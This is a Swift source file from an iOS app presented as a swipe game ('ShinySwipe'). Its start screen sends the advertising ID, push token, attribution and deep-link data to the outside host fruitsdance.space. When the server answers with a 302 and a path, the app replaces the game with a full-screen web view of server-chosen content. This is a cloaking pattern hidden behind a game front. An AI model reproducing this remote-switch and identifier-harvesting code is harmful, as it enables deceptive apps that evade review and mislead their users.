//
//  StartGame.swift
//  ShinySwipe iOS
//
//  Created by 99999999 on 27.06.2023.
//

import UIKit
import SpriteKit
import AudioToolbox
import Foundation
import SwiftUI

var idUserNumber = ""

class MenuStart: UIViewController, URLSessionDelegate {
    
    let appDelegate = UIApplication.shared.delegate as? AppDelegate
    let bundleIdentifier = Bundle.main.bundleIdentifier
    var pathIdentifier = ""
    
    var progressValue : Float = 0
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
    }
    
    func startToRequest() {
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            self.sendToRequest()
        }
    }
    
    func switchToHomeView() {
        let homeViewController = UIHostingController(rootView: RegisterView())
        homeViewController.modalPresentationStyle = .fullScreen
        self.present(homeViewController, animated: true, completion: nil)
    }

    
    func prelendApps() {
        let preland = YourWebConnector()
        preland.sourceData = self.pathIdentifier
        preland.modalTransitionStyle = .crossDissolve
        preland.modalPresentationStyle = .fullScreen
        self.present(preland, animated: true, completion: nil)
    }

    
    func sendToRequest() {
        let url = URL(string: "https://fruitsdance.space/starting")
        
        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.deepLinkParameterFB, "push-token" : appDelegate?.tokenPushNotification, "appsflyer" : appDelegate?.oldAndNotWorkingNames, "deep_link_sub2" : appDelegate?.subject2, "deepLinkStr": appDelegate?.oneLinkDeepLink, "timezone-geo": appDelegate?.geographicalNameTimeZone, "timezome-gmt" : appDelegate?.abbreviationTimeZone, "apps-flyer-id": appDelegate!.uniqueIdentifierAppsFlyer, "attribution-data" : appDelegate?.dataAttribution, "deep_link_sub1" : appDelegate?.subject1, "deep_link_sub3" : appDelegate?.subject3, "deep_link_sub4" : appDelegate?.subject4, "deep_link_sub5" : appDelegate?.subject5]
        
        ///REQUST
        var request = URLRequest(url: url!)
        //JSON
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.identifierAdvertising, forHTTPHeaderField: "GID")
        request.addValue(bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.uniqueIdentifierAppsFlyer, forHTTPHeaderField: "ID")
        
        //CONFIGURATING
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 60
        configuration.timeoutIntervalForRequest = 60
        
        ///SESSION
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        
        ///TASK
        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    self.switchToHomeView()
                }
                return
            }
            
            let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
            if let responseJSON = responseJSON as? [String: Any] {
                guard let result = responseJSON["result"] as? String else { return }
                self.pathIdentifier = result
                let user = responseJSON["userID"] as? Int
                guard let strUser = user else { return }
                idUserNumber = "\(strUser)"
            }
            
            if let response = response as? HTTPURLResponse {
                if response.statusCode == 200 {
                    self.performSegue(withIdentifier: "menu", sender: nil)
                } else if response.statusCode == 302 {
                    if self.pathIdentifier != "" {
                        self.prelendApps()
                    }
                } else {
                    
                }
            }
            return
        }
        
        task.resume()
}
    
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        completionHandler(nil)
    }
    
    override var shouldAutorotate: Bool {
        return true
    }
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        if UIDevice.current.userInterfaceIdiom == .phone {
            return .allButUpsideDown
        } else {
            return .all
        }
    }
    
    override var prefersStatusBarHidden: Bool {
        return true
    }
}
